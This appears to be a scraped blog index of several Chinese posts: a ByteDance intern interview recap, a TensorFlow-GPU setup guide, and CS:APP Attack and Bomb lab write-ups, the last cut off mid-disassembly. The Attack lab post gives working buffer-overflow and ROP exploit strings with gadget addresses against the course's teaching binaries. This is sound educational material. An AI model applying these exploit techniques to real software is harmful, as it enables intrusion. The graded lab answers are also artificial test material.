讲讲HashMap实现原理，HashTable和HashMap有什么不同？ 讲讲ConcurrentHashMap怎么实现的，有什么特点？ Object的wait()和notify()方法有什么作用？ 讲讲Jvm内存结构。 synchronized和Lock在 API/使用上有什么不同？ 了解过Redis吗，Redis有哪些常见数据结构？ 剩余的记不清了… ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:1:1","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"算法题 如何判断两个单链表是否有交点，单链表是否成环？ n个二极管，超过n/2个二极管是好的。两个二极管可以相互判断对方是好还是坏，好的二极管给的判断一定是准确的，坏的二极管给出的结果是不准确的。找出所有好的二极管。 写出二叉树的层序遍历。 ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:1:2","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"反问 请问岗位工作具体是干什么？ 一般面试学生主要考察基础知识，为啥没有询问 OS/计网的知识？ 答：目前比较需要能尽快上手工作的实习生，所以先考察技术。 ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:1:3","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"第二轮面试 首先自我介绍 然后询问一下去年在头条的实习经历，谈了一下简历上的大作业。 ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:2:0","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"基础知识 讲讲网络的五层模型结构。 讲讲三次握手、四次挥手。 为什么要三次握手，四次挥手？ 讲讲线程和进程的区别？ 谈谈对协程的理解。 线程间什么时候产生死锁？如何进行死锁避免/预防？ Java有哪些常见容器？ ConcurrentHashMap在并发访问时相较于HashTable有什么缺点？ 一时没想起来，面试官提示了size()，然后我讲了下ConcurrentHashMap在并发访问时调用size()的过程及overhead。 ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:2:1","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"算法题 写一个二叉树左视图 刚开始想到层序遍历，然后只记录每层第一个节点，后来面试官提示我简化，写成递归版本。 ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:2:2","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"提问 主要开发写什么，用什么技术栈？ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:2:3","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"HR 面试 ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:3:0","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"HR 问 首先自我介绍 问有什么爱好？ 实习时间，对未来的职业规划？ 上次实习的经历，遇到什么困难？ 本次实习预计完成什么目标 对加班的想法，接收度。 ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:3:1","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["面经"],"content":"提问 实习地点 最终在4-25收到了 offer call，确认了一下薪资福利，实习时间等。总的来说，今年春招实习投递经历主要是积攒经验了，最开始的两家准备不足，被挂的挺惨。之后面向面试学习了一段时间才拿到这个 offer。 ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:3:2","tags":["面经","后端","Java"],"title":"20年字节跳动后端开发面试","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["Linux"],"content":"显卡驱动 最新的 18.04.3 已经可以安装 430 驱动 sudo apt install nvidia-driver-430 ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:1:0","tags":["tensorflow-gpu"],"title":"Ubuntu安装tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"安装要求 官网有安装所需软件要求 ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:2:0","tags":["tensorflow-gpu"],"title":"Ubuntu安装tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"安装 cuda 及其组件 去官网下载cuda 安装 runfile 及其补丁， # Add NVIDIA package repository chmod +x ./cuda_10.0.130_410.48_linux.run ./cuda_10.0.130.1_linux.run sudo ./cuda_10.0.130_410.48_linux.run sudo ./cuda_10.0.130.1_linux.run 注意不要重复安装 nvidia 显卡驱动。 然后下载cudnn. tar -zxvf cudnn-10.0-linux-x64-v7.6.2.24.tgz sudo cp cuda/include/cudnn.h /usr/local/cuda/include sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64 sudo chmod a+r /usr/local/cuda/include/cudnn.h /usr/local/cuda/lib64/libcudnn* 然后设置环境变量(cuda 安装完成时会提示) export PATH=/usr/local/cuda/bin/:$PATH export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda/extras/CUPTI/lib64 检验下安装 wmc@omen:~$ nvcc -V nvcc: NVIDIA (R) Cuda compiler driver Copyright (c) 2005-2018 NVIDIA Corporation Built on Sat_Aug_25_21:08:01_CDT_2018 Cuda compilation tools, release 10.0, V10.0.130 ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:3:0","tags":["tensorflow-gpu"],"title":"Ubuntu安装tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"Anaconda Anaconda 安装十分简单.去喜闻乐见的tuna下载。 chmod +x Anaconda3-2019.07-Linux-x86_64.sh ./Anaconda3-2019.07-Linux-x86_64.sh 更换 anaconda 和 pip 镜像源 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --set show_channel_urls yes pip install pip -U pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 安装完成后，我们使用创建一个新的 python 虚拟环境，安装 tensorflow-gpu. conda create -n tensor pip python=3.6 source activate tensor pip install --upgrade tensorflow-gpu ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:4:0","tags":["tensorflow-gpu"],"title":"Ubuntu安装tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"安装 jupyter 插件 conda install -c conda-forge jupyter_contrib_nbextensions jupyter contrib nbextension install --user ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:4:1","tags":["tensorflow-gpu"],"title":"Ubuntu安装tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"将 conda 虚拟环境作为 jupyter 内核 conda activate tensorflowenv pip install ipykernel python -m ipykernel install --user --name tensorflowenv --display-name \"Python (tensorflowenv)\" ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:4:2","tags":["tensorflow-gpu"],"title":"Ubuntu安装tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"示例测试 import tensorflow as tf mnist = tf.keras.datasets.mnist (x_train, y_train),(x_test, y_test) = mnist.load_data() x_train, x_test = x_train / 255.0, x_test / 255.0 model = tf.keras.models.Sequential([ tf.keras.layers.Flatten(input_shape=(28, 28)), tf.keras.layers.Dense(128, activation='relu'), tf.keras.layers.Dropout(0.2), tf.keras.layers.Dense(10, activation='softmax') ]) model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy']) model.fit(x_train, y_train, epochs=5) model.evaluate(x_test, y_test) 运行结果 ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:5:0","tags":["tensorflow-gpu"],"title":"Ubuntu安装tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["CS:APP"],"content":"实验描述 本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在 getbuf 函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:1:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"第一阶段 第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。 那么我们将需要执行的操作码和地址输入机器码即可。 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:2:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_1 第一关非常简单，题目主要我们在 getbuf 执行完成后执行 touch1,touch1()无参。 (gdb) disas getbuf Dump of assembler code for function getbuf: 0x0000000000401688 \u003c+0\u003e: sub $0x18,%rsp 0x000000000040168c \u003c+4\u003e: mov %rsp,%rdi 0x000000000040168f \u003c+7\u003e: callq 0x4018ca \u003cGets\u003e 0x0000000000401694 \u003c+12\u003e: mov $0x1,%eax 0x0000000000401699 \u003c+17\u003e: add $0x18,%rsp 0x000000000040169d \u003c+21\u003e: retq End of assembler dump. (gdb) disas touch1 Dump of assembler code for function touch1: 0x00000000004016a0 \u003c+0\u003e: sub $0x8,%rsp 0x00000000004016a4 \u003c+4\u003e: movl $0x1,0x2029ee(%rip) # 0x60409c \u003cvlevel\u003e 0x00000000004016ae \u003c+14\u003e: mov $0x402e4e,%edi 0x00000000004016b3 \u003c+19\u003e: callq 0x400bd0 \u003cputs@plt\u003e 0x00000000004016b8 \u003c+24\u003e: mov $0x1,%edi 0x00000000004016bd \u003c+29\u003e: callq 0x401ab5 \u003cvalidate\u003e 0x00000000004016c2 \u003c+34\u003e: mov $0x0,%edi 0x00000000004016c7 \u003c+39\u003e: callq 0x400d60 \u003cexit@plt\u003e End of assembler dump. 可以看到，getbuf 开出了 0x18，即 24 字节的空间，touch1 的地址为 0x4016a0。那么我们只需填满这 0x28 空间，再以 touch1 地址替代返回值。注意：x86-64 机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0 16 40 00 00 00 00 00 转换后输入即可 Cookie: 0x63149380 Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:2:1","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_2 第二关根据题意，需要调用 touch2，需要传递一个无符号整数值，其值为 cookie，查看 cookie 文件，如下。 2017211523@bupt3:~/target117$ cat cookie.txt 0x63149380 为了给 touch2 传参，我们需要将 cookie 值赋给%rdi，然后将 touch2 地址压栈，使用 ret 弹出 touch2 地址返回，调用 touch2。 mov $0x63149380,%rdi pushq $0x4016cc ret 将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。 phase2.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: 48 c7 c7 80 93 14 63 mov $0x63149380,%rdi 7: 68 cc 16 40 00 pushq $0x4016cc c: c3 retq 我们将指令的机器码放在 getbuf 时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用 getbuf 时栈顶地址为 0x5566f7a8。 48 c7 c7 80 93 14 63 68 cc 16 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 a8 f7 66 55 00 00 00 00 输入运行。 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase2 | ./ctarget -q Cookie: 0x63149380 Type string:Touch2!: You called touch2(0x63149380) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:2:2","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_3 查看 touch3 void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); } exit(0); } 可知其需要一个指向字符的指针 sval，然后调用 hexmatch，将 cookie 和 sval 作为参数传入，需要 hexomatch 返回非零值。 int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0; } 由 hexmatch 可知，其比较 cookie 的字符串表示与传入的字符串是否相等，相等则返回 1，那么问题明了，我们需要将表示 cookie 的字符串地址传给 touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用 hexmatch 时候未被重写改变的空间，借以保存字符串。 mov $0x5566f7c8,%rdi pushq $0x4017a0 ret 这里我们将 cookie 的字符串表示放在 0x5566f7c8，编译再反汇编得到机器码 phase3.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: 48 c7 c7 c8 f7 66 55 mov $0x5566f7c8,%rdi 7: 68 a0 17 40 00 pushq $0x4017a0 c: c3 retq 查表得出 cookie 字符串的 16 进制表示为 36 33 31 34 39 33 38 30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\\0’，得到攻击字符串如下 48 c7 c7 c8 f7 66 55 68 a0 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 a8 f7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00 转换输入运行 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase3 | ./ctarget -q Cookie: 0x63149380 Type string:Touch3!: You called touch3(\"63149380\") Valid solution for level 3 with target ctarget PASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:2:3","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"第二阶段 在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施： 1.函数栈随机化 ，无法再获取绝对地址。 2.栈内存的内容被锁定为不可执行。 故此，我们需要使用 ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用 ret 指令返回完成所需操作。 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:3:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_4 此关需用 ROP 方法完成 phase_2 内容。那么就需要在操作中得到 cookie 值，那么只有用 pop 指令了，需要指令为。 popq %rax movq %rax,%rdi ret 查找官方的 write up，得知对应机器码，然后在在 rtarget 文件的反汇编文件中利用 vim 查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3c 18 40 00 00 00 00 00 /* popq rax */ 80 93 14 63 00 00 00 00 /* cookie */ 49 18 40 00 00 00 00 00 /* movq %rax,%rdi */ cc 16 40 00 00 00 00 00 /* touch2 */ 转换输入运行 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase4 | ./rtarget Cookie: 0x63149380 Type string:Touch2!: You called touch2(0x63149380) Valid solution for level 2 with target rtarget PASS: Sent exploit string to server to be validated. NICE JOB! ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:3:1","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_5 此关为 phase_3 的 ROP 版本，我们需要查找 start_farm 到 end_farm 中的 gadgets，拼凑出代码实现 phase_3 中插入代码的功能。还需注意： 1.0x90 代表 nop，除了将 pc 加 1 之外不做任何事。 2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。 需要的指令有 movq %rsp,%rax movq %rax,%rdi popq %rax movl %eax,%ecx movl %ecx,%edx movl %edx,%esi lea(%rdi, %rsi, 1),%rax movq %rax,%rdi 则攻击字符串为 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 bd 18 40 00 00 00 00 00 /* gadget1 */ 49 18 40 00 00 00 00 00 /* gadget2 */ 30 18 40 00 00 00 00 00 /* gadget3 */ 48 00 00 00 00 00 00 00 /* cookie字符串偏移量*/ 13 19 40 00 00 00 00 00 /* gadget4 */ ca 18 40 00 00 00 00 00 /* gadget5 */ b7 18 40 00 00 00 00 00 /* gadget6 */ 69 18 40 00 00 00 00 00 /* gadget7 */ 49 18 40 00 00 00 00 00 /* gadget8 */ a0 17 40 00 00 00 00 00 /* touch3地址 */ 36 33 31 34 39 33 38 30 /* cookie字符串 */ 00 转换文件运行 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase5 | ./rtarget Cookie: 0x63149380 Type string:Touch3!: You called touch3(\"63149380\") Valid solution for level 3 with target rtarget PASS: Sent exploit string to server to be validated. NICE JOB! ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:3:2","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"到此为止 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:4:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"实验步骤 ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:0","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"准备工作 使用tar -vxf将炸弹压缩包解压,cd 进入,可以从 bomb.c 中看出实验的用意以及程序的大致 逻辑,bomb 为可执行程序,使用 gdb 调试该程序. (gdb) b read_line Breakpoint 1 at 0x40155c (gdb) b explode_bomb Breakpoint 2 at 0x4014e4 给 read_line 函数打上断点,以便每次输入运行一关.给 explode_bomb 打上断点,以便在炸弹爆炸 前可以处理. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:1","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_1 获得 phase_1 汇编代码 (gdb) disas phase_1 Dump of assembler code for function phase_1: 0x0000000000400e80 \u003c+0\u003e: sub $0x8,%rsp 0x0000000000400e84 \u003c+4\u003e: mov $0x4024a0,%esi 0x0000000000400e89 \u003c+9\u003e: callq 0x40127e \u003cstrings_not_equal\u003e 0x0000000000400e8e \u003c+14\u003e: test %eax,%eax 0x0000000000400e90 \u003c+16\u003e: je 0x400e97 \u003cphase_1+23\u003e 0x0000000000400e92 \u003c+18\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400e97 \u003c+23\u003e: add $0x8,%rsp 0x0000000000400e9b \u003c+27\u003e: retq End of assembler dump. 可见,此题是将我们输入的字符串与地址 0x4024a0 处字符串比较,不等则爆炸.查看该字符串. (gdb) x/s 0x4024a0 0x4024a0 \u003c__dso_handle+344\u003e: \"We have to stand with our North Korean allies.\" 那么答案是 We have to stand with our North Korean allies. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:2","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_2 (gdb) disas phase_2 Dump of assembler code for function phase_2: 0x0000000000400e9c \u003c+0\u003e: push %rbp 0x0000000000400e9d \u003c+1\u003e: push %rbx 0x0000000000400e9e \u003c+2\u003e: sub $0x28,%rsp 0x0000000000400ea2 \u003c+6\u003e: mov %rsp,%rsi 0x0000000000400ea5 \u003c+9\u003e: callq 0x40151a \u003cread_six_numbers\u003e 0x0000000000400eaa \u003c+14\u003e: cmpl $0x1,(%rsp) 0x0000000000400eae \u003c+18\u003e: je 0x400ed0 \u003cphase_2+52\u003e 0x0000000000400eb0 \u003c+20\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400eb5 \u003c+25\u003e: jmp 0x400ed0 \u003cphase_2+52\u003e 0x0000000000400eb7 \u003c+27\u003e: mov -0x4(%rbx),%eax 0x0000000000400eba \u003c+30\u003e: add %eax,%eax 0x0000000000400ebc \u003c+32\u003e: cmp %eax,(%rbx) 0x0000000000400ebe \u003c+34\u003e: je 0x400ec5 \u003cphase_2+41\u003e 0x0000000000400ec0 \u003c+36\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400ec5 \u003c+41\u003e: add $0x4,%rbx 0x0000000000400ec9 \u003c+45\u003e: cmp %rbp,%rbx 0x0000000000400ecc \u003c+48\u003e: jne 0x400eb7 \u003cphase_2+27\u003e 0x0000000000400ece \u003c+50\u003e: jmp 0x400edc \u003cphase_2+64\u003e 0x0000000000400ed0 \u003c+52\u003e: lea 0x4(%rsp),%rbx 0x0000000000400ed5 \u003c+57\u003e: lea 0x18(%rsp),%rbp 0x0000000000400eda \u003c+62\u003e: jmp 0x400eb7 \u003cphase_2+27\u003e 0x0000000000400edc \u003c+64\u003e: add $0x28,%rsp ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x0000000000400ee0 \u003c+68\u003e: pop %rbx 0x0000000000400ee1 \u003c+69\u003e: pop %rbp 0x0000000000400ee2 \u003c+70\u003e: retq End of assembler dump. +3 处发现在栈中开辟了 0x28 的内存区域.然后将%rsp 的值传给%rsi 作为 参数传给函数 read_six_numbers,可以看出应该使用开辟的空闲内存做 数组,记数组为 r,读取六个数字.将(%rsp)和 0x1 比较,如果不等,就会爆 炸,(％rsp)为数组首元,故 r[0]＝１;跳转到+52,将 r[1]地址赋给%rbx, 将 r6地址赋给%rbp,跳到+27,将%eax 设为%rbx 指向的前一个 数,此时为 r[0],比较 r[1]和 2*r[0]是否相等,不等则爆炸.跳转到+41,％ rbx+4,比较%rbx 和%rbp,不等跳转到+27,重复,等则跳转到+64 结束,成功 .可以看出，这是一个循环比较.等价于下面的 c 语 a 言 for(int *b = \u0026r[1]; b != \u0026r[6]; b++) { if(*b != 2 * (*(b - 1))) call explode_bomb; 故答案应该为 1 2 4 8 16 32. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:3","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_3 0x0000000000400ef1 \u003c+14\u003e: mov $0x4027cd,%esi 0x0000000000400ef6 \u003c+19\u003e: mov $0x0,%eax 0x0000000000400efb \u003c+24\u003e: callq 0x400ba0 \u003c__isoc99_sscanf@plt\u003e 0x0000000000400f00 \u003c+29\u003e: cmp $0x1,%eax 查看 0x4027cd, (gdb) x/s 0x4027cd 0x4027cd: \"%d %d\" 可知,应该是读入了两个整数. 0x0000000000400f15 \u003c+50\u003e: jmpq *0x402500(,%rax,8) 0x0000000000400f1c \u003c+57\u003e: mov $0x0,%eax 0x0000000000400f21 \u003c+62\u003e: jmp 0x400f28 \u003cphase_3+69\u003e 0x0000000000400f23 \u003c+64\u003e: mov $0x19c,%eax 0x0000000000400f28 \u003c+69\u003e: sub $0xcd,%eax 0x0000000000400f2d \u003c+74\u003e: jmp 0x400f34 \u003cphase_3+81\u003e 0x0000000000400f2f \u003c+76\u003e: mov $0x0,%eax 0x0000000000400f34 \u003c+81\u003e: add $0x29b,%eax 0x0000000000400f39 \u003c+86\u003e: jmp 0x400f40 \u003cphase_3+93\u003e 0x0000000000400f3b \u003c+88\u003e: mov $0x0,%eax ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x0000000000400f40 \u003c+93\u003e: sub $0x36f,%eax 0x0000000000400f45 \u003c+98\u003e: jmp 0x400f4c \u003cphase_3+105\u003e 0x0000000000400f47 \u003c+100\u003e: mov $0x0,%eax 0x0000000000400f4c \u003c+105\u003e: add $0x36f,%eax 0x0000000000400f51 \u003c+110\u003e: jmp 0x400f58 \u003cphase_3+117\u003e 0x0000000000400f53 \u003c+112\u003e: mov $0x0,%eax 0x0000000000400f58 \u003c+117\u003e: sub $0x36f,%eax 0x0000000000400f5d \u003c+122\u003e: jmp 0x400f64 \u003cphase_3+129\u003e 0x0000000000400f5f \u003c+124\u003e: mov $0x0,%eax 0x0000000000400f64 \u003c+129\u003e: add $0x36f,%eax 0x0000000000400f69 \u003c+134\u003e: jmp 0x400f70 \u003cphase_3+141\u003e 0x0000000000400f6b \u003c+136\u003e: mov $0x0,%eax 0x0000000000400f70 \u003c+141\u003e: sub $0x36f,%eax 0x0000000000400f75 \u003c+146\u003e: jmp 0x400f81 \u003cphase_3+158\u003e 0x0000000000400f77 \u003c+148\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400f7c \u003c+153\u003e: mov $0x0,%eax 0x0000000000400f81 \u003c+158\u003e: cmpl $0x5,0xc(%rsp) 0x0000000000400f86 \u003c+163\u003e: jg 0x400f8e \u003cphase_3+171\u003e 0x0000000000400f88 \u003c+165\u003e: cmp 0x8(%rsp),%eax 0x0000000000400f8c \u003c+169\u003e: je 0x400f93 \u003cphase_3+176\u003e 0x0000000000400f8e \u003c+171\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 由这段汇编代码可知,这是一段 switch 语句,使用输入的第一个值作为 key, 经过对应跳转位置的操作后应与第二个数相等. (gdb) p/x *（0x402500 + 32） $1 = 0x400f47 那么第一个数为 0 时,跳转到 0x400f23 处,那么第二个数应该为此处的 0x0, 故一组答案为 4 0; ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:4","tags":["CS:APP","汇编","二进制炸弹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_4 (gdb) disas phase_4 Dump of assembler code for function phase_4: 0x0000000000400fd0 \u003c+0\u003e: sub $0x18,%rsp 0x0000000000400fd4 \u003c+4\u003e: lea 0xc(%rsp),%rcx 0x0000000000400fd9 \u003c+9\u003e: lea 0x8(%rsp),%rdx 0x0000000000400fde \u003c+14\u003e: mov $0x4027cd,%esi 0x0000000000400fe3 \u003c+19\u003e: mov $0x0,%eax 0x0000000000400fe8 \u003c+24\u003e: callq 0x400ba0 \u003c__isoc99_sscanf@plt\u003e 0x0000000000400fed \u003c+29\u003e: cmp $0x2,%eax 0x0000000000400ff0 \u003c+32\u003e: jne 0x400ffe \u003cphase_4+46\u003e 0x0000000000400ff2 \u003c+34\u003e: mov 0xc(%rsp),%eax 0x0000000000400ff6 \u003c+38\u003e: sub $0x2,%eax 0x0000000000400ff9 \u003c+41\u003e: cmp $0x2,%eax 0x0000000000400ffc \u003c+44\u003e: jbe 0x401003 \u003cphase_4+51\u003e 0x0000000000400ffe \u003c+46\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401003 \u003c+51\u003e: mov 0xc(%rsp),%esi 0x0000000000401007 \u003c+55\u003e: mov $0x9,%edi 0x000000000040100c \u003c+60\u003e: callq 0x400f98 \u003cfunc4\u003e 0x0000000000401011 \u003c+65\u003e: cmp 0x8(%rsp),%eax 0x0000000000401015 \u003c+69\u003e: je 0x40101c \u003cphase_4+76\u003e 0x0000000000401017 \u003c+71\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x000000000040101c \u003c+76\u003e: add $0x18,%rsp 0x0000000000401020 \u003c+80\u003e: retq End of assembler dump. 由代码易知,phase_4 读入了两个数,第二个数在 2-4 之间,然后将第二个数作为 func4 的第二个参数,func4 第一个参数为 9,输入的第一个数必须和 func4 返回值相等. (gdb) disas func4 Dump of assembler code for function func4: 0x0000000000400f98 \u003c+0\u003e: push %r12 0x0000000000400f9a \u003c+2\u003e: push %rbp 0x0000000000400f9b \u003c+3\u003e: push %rbx 0x0000000000400f9c \u003c+4\u003e: mov %edi,%ebx 0x0000000000400f9e \u003c+6\u003e: test %edi,%edi 0x0000000000400fa0 \u003c+8\u003e: jle 0x400fc6 \u003cfunc4+46\u003e 0x0000000000400fa2 \u003c+10\u003e: mov %esi,%ebp 0x0000000000400fa4 \u003c+12\u003e: mov %esi,%eax 0x0000000000400fa6 \u003c+14\u003e: cmp $0x1,%edi 0x0000000000400fa9 \u003c+17\u003e: je 0x400fcb \u003cfunc4+51\u003e 0x0000000000400fab \u003c+19\u003e: lea -0x1(%rdi),%edi 0x0000000000400fae \u003c+22\u003e: callq 0x400f98 \u003cfunc4\u003e 0x0000000000400fb3 \u003c+27\u003e: lea (%rax,%rbp,1),%r12d 0x0000000000400fb7 \u003c+31\u003e: lea -0x2(%rbx),%edi 0x0000000000400fba \u003c+34\u003e: mov %ebp,%esi 0x0000000000400fbc \u003c+36\u003e: callq 0x400f98 \u003cfunc4\u003e 0x0000000000400fc1 \u003c+41\u003e: add %r12d,%eax 0x0000000000400fc4 